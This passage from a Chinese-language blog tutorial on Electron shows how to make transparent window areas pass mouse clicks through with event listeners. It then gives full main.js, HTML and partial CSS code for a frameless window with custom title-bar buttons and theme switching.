class="attr">d</span>=<span class="string">&quot;M810.666667 938.666667h-128c-25.6 0-42.666667-17.066667-42.666667-42.666667s17.066667-42.666667 42.666667-42.666667h128c25.6 0 42.666667-17.066667 42.666666-42.666666v-128c0-25.6 17.066667-42.666667 42.666667-42.666667s42.666667 17.066667 42.666667 42.666667v128c0 72.533333-55.466667 128-128 128zM341.333333 938.666667H213.333333c-72.533333 0-128-55.466667-128-128v-128c0-25.6 17.066667-42.666667 42.666667-42.666667s42.666667 17.066667 42.666667 42.666667v128c0 25.6 17.066667 42.666667 42.666666 42.666666h128c25.6 0 42.666667 17.066667 42.666667 42.666667s-17.066667 42.666667-42.666667 42.666667zM896 384c-25.6 0-42.666667-17.066667-42.666667-42.666667V213.333333c0-25.6-17.066667-42.666667-42.666666-42.666666h-128c-25.6 0-42.666667-17.066667-42.666667-42.666667s17.066667-42.666667 42.666667-42.666667h128c72.533333 0 128 55.466667 128 128v128c0 25.6-17.066667 42.666667-42.666667 42.666667zM128 384c-25.6 0-42.666667-17.066667-42.666667-42.666667V213.333333c0-72.533333 55.466667-128 128-128h128c25.6 0 42.666667 17.066667 42.666667 42.666667s-17.066667 42.666667-42.666667 42.666667H213.333333c-25.6 0-42.666667 17.066667-42.666666 42.666666v128c0 25.6-17.066667 42.666667-42.666667 42.666667z&quot;</span></span></span><br><span class="line"><span class="tag">                          <span class="attr">fill</span>=<span class="string">&quot;#8a8a8a&quot;</span> <span class="attr">p-id</span>=<span class="string">&quot;5183&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">path</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">svg</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;minisize&quot;</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">svg</span> <span class="attr">t</span>=<span class="string">&quot;1737720624130&quot;</span> <span class="attr">class</span>=<span class="string">&quot;icon&quot;</span> <span class="attr">viewBox</span>=<span class="string">&quot;0 0 1024 1024&quot;</span> <span class="attr">version</span>=<span class="string">&quot;1.1&quot;</span></span></span><br><span class="line"><span class="tag">                     <span class="attr">xmlns</span>=<span class="string">&quot;http://www.w3.org/2000/svg&quot;</span> <span class="attr">p-id</span>=<span class="string">&quot;3308&quot;</span> <span class="attr">width</span>=<span class="string">&quot;12.5&quot;</span> <span class="attr">height</span>=<span class="string">&quot;32&quot;</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">path</span></span></span><br><span class="line"><span class="tag">                          <span class="attr">d</span>=<span class="string">&quot;M930.355 551.424H94.218c-23.987 0-43.975-17.408-43.975-39.424 0-21.504 19.42-39.424 43.975-39.424h835.564c23.987 0 43.975 17.408 43.975 39.424 0.006 22.016-19.415 39.424-43.402 39.424z&quot;</span></span></span><br><span class="line"><span class="tag">                          <span class="attr">fill</span>=<span class="string">&quot;#8a8a8a&quot;</span> <span class="attr">p-id</span>=<span class="string">&quot;3309&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">path</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">svg</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!-- Main Content ################ 这里是客户区，也就是所有半透明的部分，所有的东西都要写在这个div里面--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;blurBackground&quot;</span> <span class="attr">id</span>=<span class="string">&quot;IgnoreBackground&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">button</span> <span class="attr">class</span>=<span class="string">&quot;chd&quot;</span> <span class="attr">onclick</span>=<span class="string">&quot;openNewWindow()&quot;</span>&gt;</span>打开新窗口<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">button</span> <span class="attr">class</span>=<span class="string">&quot;chd&quot;</span> <span class="attr">onclick</span>=<span class="string">&quot;openNewWindow()&quot;</span>&gt;</span>打开新窗口<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;chd&quot;</span> <span class="attr">style</span>=<span class="string">&quot;width: 200px; height: 100px; background-color: green; display: flex; flex-direction: column;&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">button</span>  <span class="attr">onclick</span>=<span class="string">&quot;openNewWindow()&quot;</span>&gt;</span>打开新窗口<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">button</span>  <span class="attr">onclick</span>=<span class="string">&quot;openNewWindow()&quot;</span>&gt;</span>打开新窗口<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>index.html：首先要给整个客户区绑定一个id: <code>IgnoreBackground</code></p>
<p>在index.js中监听这个区域：鼠标移入非客户区的时候（标题栏）时不忽略鼠标，也就是让鼠标还能在标题栏中进行各种操作（拖动窗口或点击右侧按钮），鼠标移入客户区 (id&#x3D;”IgnoreBackground”) 的时候，向主进程通信，忽略鼠标</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;IgnoreBackground&#x27;</span>).<span class="title function_">addEventListener</span>(<span class="string">&#x27;mouseenter&#x27;</span>, <span class="function">(<span class="params">event</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (event.<span class="property">target</span>.<span class="property">id</span> === <span class="string">&#x27;IgnoreBackground&#x27;</span>) &#123;</span><br><span class="line">        <span class="variable language_">window</span>.<span class="property">CustomAPI</span>.<span class="title class_">IgnoreM</span>()</span><br><span class="line">        <span class="comment">// console.log(&#x27;IgnoreBackground&#x27;)</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br><span class="line"><span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;IgnoreBackground&#x27;</span>).<span class="title function_">addEventListener</span>(<span class="string">&#x27;mouseleave&#x27;</span>, <span class="function">(<span class="params">event</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (event.<span class="property">target</span>.<span class="property">id</span> === <span class="string">&#x27;IgnoreBackground&#x27;</span>) &#123;</span><br><span class="line">        <span class="variable language_">window</span>.<span class="property">CustomAPI</span>.<span class="title function_">unIgnoreM</span>()</span><br><span class="line">        <span class="comment">// console.log(&#x27;unIgnoreBackground&#x27;)</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>

<p>现在基本功能完成了，但是鼠标移入到客户区 (id&#x3D;”IgnoreBackground”) 的时候，里面的子元素没法点击啊，鼠标仍然被判断为没有移出客户区</p>
<p>这时候就给客户区中的所有下一级子元素绑定一个class（也就是上面html中的class&#x3D;”chd”），然后给所有有这个class的子元素监听<code>mouseover</code>和<code>mouseleave</code>，然后阻止子元素事件冒泡到父元素</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> elm = <span class="variable language_">document</span>.<span class="title function_">getElementsByClassName</span>(<span class="string">&#x27;chd&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; elm.<span class="property">length</span>; i++) &#123;</span><br><span class="line">    elm[i].<span class="title function_">addEventListener</span>(<span class="string">&#x27;mouseover&#x27;</span>, <span class="function">(<span class="params">event</span>) =&gt;</span> &#123;</span><br><span class="line">        event.<span class="title function_">stopPropagation</span>()</span><br><span class="line">        <span class="variable language_">window</span>.<span class="property">CustomAPI</span>.<span class="title function_">unIgnoreM</span>()</span><br><span class="line">    &#125;)</span><br><span class="line">    elm[i].<span class="title function_">addEventListener</span>(<span class="string">&#x27;mouseleave&#x27;</span>, <span class="function">(<span class="params">event</span>) =&gt;</span> &#123;</span><br><span class="line">        event.<span class="title function_">stopPropagation</span>()</span><br><span class="line">        <span class="variable language_">window</span>.<span class="property">CustomAPI</span>.<span class="title class_">IgnoreM</span>()</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>PS: 如果客户区中子元素非常多，那么建议使用js循环给子元素添加class</p>
<p>PS: 不会区分<code>mouseenter</code>、<code>mouseleave</code>、<code>mouseover</code>、<code>mouseout</code>四者的区别先自行<span style="text-decoration: line-through; color: #bbbbbb">百度</span>bing一下</p>
<p>设置完这一堆之后，就能在透明的地方实现鼠标穿透点击等操作，在绑定了class&#x3D;”chd”的地方仍然能对Electron程序中的元素进行操作</p>
<h3 id="主题切换"><a href="#主题切换" class="headerlink" title="主题切换"></a>主题切换</h3><p>这个东西比较简单，只把主要代码放在这里了，可以抄一下（以下是完整代码，所以比较长）</p>
<img src="/2025/01/23/Electron/darkmode-1740965134503-1.gif" alt="darkmode" style="zoom:50%;">

<details>
    <summary>main.js</summary>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> &#123; app, <span class="title class_">BrowserWindow</span>, ipcMain &#125; = <span class="built_in">require</span>(<span class="string">&#x27;electron&#x27;</span>)</span><br><span class="line"><span class="keyword">const</span> path = <span class="built_in">require</span>(<span class="string">&#x27;node:path&#x27;</span>)</span><br><span class="line"><span class="keyword">const</span> fs = <span class="built_in">require</span>(<span class="string">&#x27;fs&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">createWindow</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">const</span> mainWindow = <span class="keyword">new</span> <span class="title class_">BrowserWindow</span>(&#123;</span><br><span class="line">        <span class="attr">width</span>: <span class="number">800</span>,</span><br><span class="line">        <span class="attr">height</span>: <span class="number">600</span>,</span><br><span class="line">        <span class="attr">minWidth</span>: <span class="number">450</span>,</span><br><span class="line">        <span class="attr">frame</span>: <span class="literal">false</span>,</span><br><span class="line">        <span class="attr">autoHideMenuBar</span>: <span class="literal">true</span>,</span><br><span class="line">        <span class="attr">webPreferences</span>: &#123;</span><br><span class="line">            <span class="attr">preload</span>: path.<span class="title function_">join</span>(__dirname, <span class="string">&#x27;preload.js&#x27;</span>)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> mainWindow</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">whenReady</span>().<span class="title function_">then</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> mainWindowHandle = <span class="title function_">createWindow</span>()</span><br><span class="line">    mainWindowHandle.<span class="title function_">loadFile</span>(<span class="string">&#x27;pages/index/index.html&#x27;</span>)</span><br><span class="line">    mainWindowHandle.<span class="title function_">once</span>(<span class="string">&#x27;ready-to-show&#x27;</span>, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">        mainWindowHandle.<span class="title function_">show</span>()</span><br><span class="line">    &#125;)</span><br><span class="line">    </span><br><span class="line">    ipcMain.<span class="title function_">on</span>(<span class="string">&#x27;maximize&#x27;</span>, <span class="function">(<span class="params">event, value</span>) =&gt;</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (!mainWindowHandle.<span class="title function_">isMaximized</span>()) &#123;</span><br><span class="line">            mainWindowHandle.<span class="title function_">maximize</span>()</span><br><span class="line">            event.<span class="title function_">reply</span>(<span class="string">&#x27;receive-maximize-message&#x27;</span>, <span class="literal">true</span>)</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            mainWindowHandle.<span class="title function_">unmaximize</span>()</span><br><span class="line">            event.<span class="title function_">reply</span>(<span class="string">&#x27;receive-maximize-message&#x27;</span>, <span class="literal">false</span>)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">    </span><br><span class="line">    ipcMain.<span class="title function_">on</span>(<span class="string">&#x27;minimize&#x27;</span>, <span class="function">(<span class="params">event, value</span>) =&gt;</span> &#123;</span><br><span class="line">        mainWindowHandle.<span class="title function_">minimize</span>()</span><br><span class="line">    &#125;)</span><br><span class="line">    </span><br><span class="line">    ipcMain.<span class="title function_">on</span>(<span class="string">&#x27;close&#x27;</span>, <span class="function">(<span class="params">event, value</span>) =&gt;</span> &#123;</span><br><span class="line">        mainWindowHandle.<span class="title function_">close</span>()</span><br><span class="line">    &#125;)</span><br><span class="line">    </span><br><span class="line">    mainWindowHandle.<span class="title function_">on</span>(<span class="string">&#x27;maximize&#x27;</span>, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">        mainWindowHandle.<span class="property">webContents</span>.<span class="title function_">send</span>(<span class="string">&#x27;window-maximized&#x27;</span>, <span class="string">&#x27;Window is maximized&#x27;</span>);</span><br><span class="line">    &#125;)</span><br><span class="line">    mainWindowHandle.<span class="title function_">on</span>(<span class="string">&#x27;unmaximize&#x27;</span>, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">        mainWindowHandle.<span class="property">webContents</span>.<span class="title function_">send</span>(<span class="string">&#x27;window-unmaximized&#x27;</span>, <span class="string">&#x27;Window is unmaximized&#x27;</span>);</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">on</span>(<span class="string">&#x27;window-all-closed&#x27;</span>, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">    app.<span class="title function_">quit</span>()</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">on</span>(<span class="string">&#x27;dom-ready&#x27;</span>, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">    <span class="variable language_">document</span>.<span class="title function_">addEventListener</span>(<span class="string">&#x27;contextmenu&#x27;</span>, <span class="keyword">function</span> (<span class="params">event</span>) &#123;</span><br><span class="line">        event.<span class="title function_">preventDefault</span>();</span><br><span class="line">    &#125;, <span class="literal">false</span>);</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>
</details>



<details>
    <summary>index.html</summary>
    
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span> <span class="attr">content</span>=<span class="string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Document<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">&quot;stylesheet&quot;</span> <span class="attr">href</span>=<span class="string">&quot;index.css&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- Custom Title Bar --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;draggableBar&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;left-box&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">img</span> <span class="attr">id</span>=<span class="string">&quot;iconpic&quot;</span> <span class="attr">class</span>=<span class="string">&quot;light-theme-shadow&quot;</span> <span class="attr">src</span>=<span class="string">&quot;../../src/icon.png&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;tt&quot;</span> <span class="attr">style</span>=<span class="string">&quot;margin-left: 2px;&quot;</span>&gt;</span>Data Analyser<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;right-box&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;close&quot;</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">svg</span> <span class="attr">t</span>=<span class="string">&quot;1737724919494&quot;</span> <span class="attr">class</span>=<span class="string">&quot;icon&quot;</span> <span class="attr">viewBox</span>=<span class="string">&quot;0 0 1024 1024&quot;</span> <span class="attr">version</span>=<span class="string">&quot;1.1&quot;</span></span></span><br><span class="line"><span class="tag">                    <span class="attr">xmlns</span>=<span class="string">&quot;http://www.w3.org/2000/svg&quot;</span> <span class="attr">p-id</span>=<span class="string">&quot;1596&quot;</span> <span class="attr">width</span>=<span class="string">&quot;13.5&quot;</span> <span class="attr">height</span>=<span class="string">&quot;13.5&quot;</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">path</span></span></span><br><span class="line"><span class="tag">                        <span class="attr">d</span>=<span class="string">&quot;M556.8 512l281.6 281.6c12.8 12.8 12.8 32 0 44.8s-32 12.8-44.8 0L512 556.8l-281.6 281.6c-12.8 12.8-32 12.8-44.8 0s-12.8-32 0-44.8l281.6-281.6L185.6 230.4c-12.8-12.8-12.8-32 0-44.8s32-12.8 44.8 0l281.6 281.6 281.6-281.6c12.8-12.8 32-12.8 44.8 0s12.8 32 0 44.8L556.8 512z&quot;</span></span></span><br><span class="line"><span class="tag">                        <span class="attr">p-id</span>=<span class="string">&quot;1597&quot;</span> <span class="attr">fill</span>=<span class="string">&quot;#8a8a8a&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">path</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">svg</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;maxsize&quot;</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">svg</span> <span class="attr">t</span>=<span class="string">&quot;1737720715887&quot;</span> <span class="attr">class</span>=<span class="string">&quot;icon&quot;</span> <span class="attr">viewBox</span>=<span class="string">&quot;0 0 1024 1024&quot;</span> <span class="attr">version</span>=<span class="string">&quot;1.1&quot;</span></span></span><br><span class="line"><span class="tag">                    <span class="attr">xmlns</span>=<span class="string">&quot;http://www.w3.org/2000/svg&quot;</span> <span class="attr">p-id</span>=<span class="string">&quot;5182&quot;</span> <span class="attr">width</span>=<span class="string">&quot;13&quot;</span> <span class="attr">height</span>=<span class="string">&quot;13&quot;</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">path</span></span></span><br><span class="line"><span class="tag">                        <span class="attr">d</span>=<span class="string">&quot;M810.666667 938.666667h-128c-25.6 0-42.666667-17.066667-42.666667-42.666667s17.066667-42.666667 42.666667-42.666667h128c25.6 0 42.666667-17.066667 42.666666-42.666666v-128c0-25.6 17.066667-42.666667 42.666667-42.666667s42.666667 17.066667 42.666667 42.666667v128c0 72.533333-55.466667 128-128 128zM341.333333 938.666667H213.333333c-72.533333 0-128-55.466667-128-128v-128c0-25.6 17.066667-42.666667 42.666667-42.666667s42.666667 17.066667 42.666667 42.666667v128c0 25.6 17.066667 42.666667 42.666666 42.666666h128c25.6 0 42.666667 17.066667 42.666667 42.666667s-17.066667 42.666667-42.666667 42.666667zM896 384c-25.6 0-42.666667-17.066667-42.666667-42.666667V213.333333c0-25.6-17.066667-42.666667-42.666666-42.666666h-128c-25.6 0-42.666667-17.066667-42.666667-42.666667s17.066667-42.666667 42.666667-42.666667h128c72.533333 0 128 55.466667 128 128v128c0 25.6-17.066667 42.666667-42.666667 42.666667zM128 384c-25.6 0-42.666667-17.066667-42.666667-42.666667V213.333333c0-72.533333 55.466667-128 128-128h128c25.6 0 42.666667 17.066667 42.666667 42.666667s-17.066667 42.666667-42.666667 42.666667H213.333333c-25.6 0-42.666667 17.066667-42.666666 42.666666v128c0 25.6-17.066667 42.666667-42.666667 42.666667z&quot;</span></span></span><br><span class="line"><span class="tag">                        <span class="attr">fill</span>=<span class="string">&quot;#8a8a8a&quot;</span> <span class="attr">p-id</span>=<span class="string">&quot;5183&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">path</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">svg</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;minisize&quot;</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">svg</span> <span class="attr">t</span>=<span class="string">&quot;1737720624130&quot;</span> <span class="attr">class</span>=<span class="string">&quot;icon&quot;</span> <span class="attr">viewBox</span>=<span class="string">&quot;0 0 1024 1024&quot;</span> <span class="attr">version</span>=<span class="string">&quot;1.1&quot;</span></span></span><br><span class="line"><span class="tag">                    <span class="attr">xmlns</span>=<span class="string">&quot;http://www.w3.org/2000/svg&quot;</span> <span class="attr">p-id</span>=<span class="string">&quot;3308&quot;</span> <span class="attr">width</span>=<span class="string">&quot;12.5&quot;</span> <span class="attr">height</span>=<span class="string">&quot;32&quot;</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">path</span></span></span><br><span class="line"><span class="tag">                        <span class="attr">d</span>=<span class="string">&quot;M930.355 551.424H94.218c-23.987 0-43.975-17.408-43.975-39.424 0-21.504 19.42-39.424 43.975-39.424h835.564c23.987 0 43.975 17.408 43.975 39.424 0.006 22.016-19.415 39.424-43.402 39.424z&quot;</span></span></span><br><span class="line"><span class="tag">                        <span class="attr">fill</span>=<span class="string">&quot;#8a8a8a&quot;</span> <span class="attr">p-id</span>=<span class="string">&quot;3309&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">path</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">svg</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;theme&quot;</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">svg</span> <span class="attr">style</span>=<span class="string">&quot;margin-top: 1px;&quot;</span> <span class="attr">t</span>=<span class="string">&quot;1740838433864&quot;</span> <span class="attr">class</span>=<span class="string">&quot;icon&quot;</span> <span class="attr">viewBox</span>=<span class="string">&quot;0 0 1024 1024&quot;</span> <span class="attr">version</span>=<span class="string">&quot;1.1&quot;</span></span></span><br><span class="line"><span class="tag">                    <span class="attr">xmlns</span>=<span class="string">&quot;http://www.w3.org/2000/svg&quot;</span> <span class="attr">p-id</span>=<span class="string">&quot;3190&quot;</span> <span class="attr">width</span>=<span class="string">&quot;17.5&quot;</span> <span class="attr">height</span>=<span class="string">&quot;17.5&quot;</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">path</span></span></span><br><span class="line"><span class="tag">                        <span class="attr">d</span>=<span class="string">&quot;M549.302857 84.297143c0-20.150857-17.152-37.302857-37.302857-37.302857s-37.284571 17.152-37.284571 37.302857V174.262857c0 20.150857 17.152 37.302857 37.302857 37.302857 20.114286 0 37.266286-17.152 37.266285-37.302857z m174.409143 163.273143c-14.134857 14.573714-14.134857 38.582857 0 52.717714 14.573714 14.573714 38.144 14.994286 53.138286 0l63.872-63.853714a37.76 37.76 0 0 0 0-53.156572c-14.153143-14.134857-38.144-14.134857-52.717715 0z m-476.562286 52.717714c14.134857 14.573714 38.144 14.573714 52.699429 0 14.153143-13.714286 14.153143-38.582857 0.438857-52.717714l-63.853714-64.292572c-13.714286-13.714286-38.144-14.134857-52.717715 0-14.153143 14.153143-14.153143 38.582857-0.438857 52.717715zM512 293.430857c-119.570286 0-218.569143 98.998857-218.569143 218.569143S392.411429 731.008 512 731.008c119.149714 0 218.148571-99.437714 218.148571-219.008 0-119.588571-98.998857-218.569143-218.148571-218.569143z m0 65.572572c83.565714 0 152.996571 69.430857 152.996571 152.996571S595.565714 665.417143 512 665.417143c-84.004571 0-153.417143-69.851429-153.417143-153.417143s69.412571-152.996571 153.417143-152.996571z m426.422857 190.281142c20.150857 0 37.302857-17.133714 37.302857-37.284571s-17.152-37.302857-37.302857-37.302857h-89.563428c-20.150857 0-37.302857 17.152-37.302858 37.302857s17.152 37.284571 37.302858 37.284571zM85.577143 474.715429c-20.150857 0-37.302857 17.133714-37.302857 37.284571s17.152 37.284571 37.302857 37.284571h89.563428c20.150857 0 37.302857-17.133714 37.302858-37.284571s-17.152-37.302857-37.302858-37.302857zM776.411429 724.114286a38.034286 38.034286 0 0 0-52.717715 0c-14.134857 14.153143-14.134857 38.162286 0 52.717714L788.004571 841.142857c14.573714 14.134857 38.582857 13.714286 52.717715-0.420571 14.573714-14.153143 14.573714-38.144 0-52.717715z m-593.152 63.451428c-14.555429 14.134857-14.555429 38.564571-0.420572 52.699429 14.153143 14.153143 38.582857 14.573714 53.138286 0.438857l63.853714-63.872c14.153143-14.134857 14.153143-38.144 0.438857-52.699429-14.153143-14.153143-38.582857-14.153143-53.138285 0z m366.006857 62.134857c0-20.150857-17.133714-37.302857-37.284572-37.302857s-37.284571 17.152-37.284571 37.302857v90.002286c0 20.132571 17.152 37.284571 37.302857 37.284572 20.114286 0 37.266286-17.152 37.266286-37.302858z&quot;</span></span></span><br><span class="line"><span class="tag">                        <span class="attr">p-id</span>=<span class="string">&quot;3191&quot;</span> <span class="attr">data-spm-anchor-id</span>=<span class="string">&quot;a313x.search_index.0.i0.227f3a81VKAdac&quot;</span> <span class="attr">class</span>=<span class="string">&quot;selected&quot;</span></span></span><br><span class="line"><span class="tag">                        <span class="attr">fill</span>=<span class="string">&quot;#8a8a8a&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">path</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">svg</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;content&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;module&quot;</span> <span class="attr">src</span>=<span class="string">&quot;index.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
</details>


<details>
    <summary>index.css</summary>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">body</span> &#123;</span><br><span class="line">    <span class="attribute">margin</span>: <span class="number">0</span>;</span><br><span class="line">    <span class="attribute">padding</span>: <span class="number">0</span>;</span><br><span class="line">    <span class="attribute">white-space</span>: nowrap;</span><br><span class="line">    <span class="attribute">height</span>: <span class="number">100vh</span>;</span><br><span class="line">    <span class="attribute">display</span>: flex;</span><br><span class="line">    <span class="attribute">flex-direction</span>: column;</span><br><span class="line">    <span class="attribute">border-radius</span>: <span class="number">20px</span>;</span><br><span class="line">    <span class="attribute">transition</span>: background-color <span class="number">0.5s</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.content</span> &#123;</span><br><span class="line">    <span class="attribute">flex-grow</span>: <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-id">#draggableBar</span> &#123;</span><br><span class="line">    <span class="attribute">background-color</span>: <span class="built_in">rgb</span>(<span class="number">243</span>, <span class="number">243</span>, <span class="number">243</span>);</span><br><span class="line">    <span class="attribute">height</span>: <span class="number">30px</span>;</span><br><span class="line">    <span class="attribute">width</span>: <span class="number">100%</span>;</span><br><span class="line">    <span class="attribute">display</span>: flex;</span><br><span class="line">    <span class="attribute">flex-direction</span>: row;</span><br><span class="line">    <span class="attribute">transition</span>: background-color <span class="number">0.5s</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="selector-id">#left-box</span> &#123;</span><br><span class="line">    <span class="attribute">height</span>: <span class="number">100%</span>;</span><br><span class="line">    <span class="attribute">flex-grow</span>: <span class="number">1</span>;</span><br><span class="line">    <span 